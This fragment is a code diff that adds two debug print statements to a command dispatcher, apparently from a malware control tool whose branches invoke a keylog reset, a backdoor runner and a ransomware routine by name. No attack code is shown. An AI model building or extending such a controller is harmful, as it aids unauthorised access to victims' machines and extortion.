@@ -78,7 +78,9 @@ def main():
                     instructions.reset_keylog_file()
 
             elif result[0] == "backdoor":
+                print("test1")
                 if len(result) >= 3:
+                    print("test2")
                     backdoor.run(result[1], result[2])
 
             elif result[0] == "ransomware":
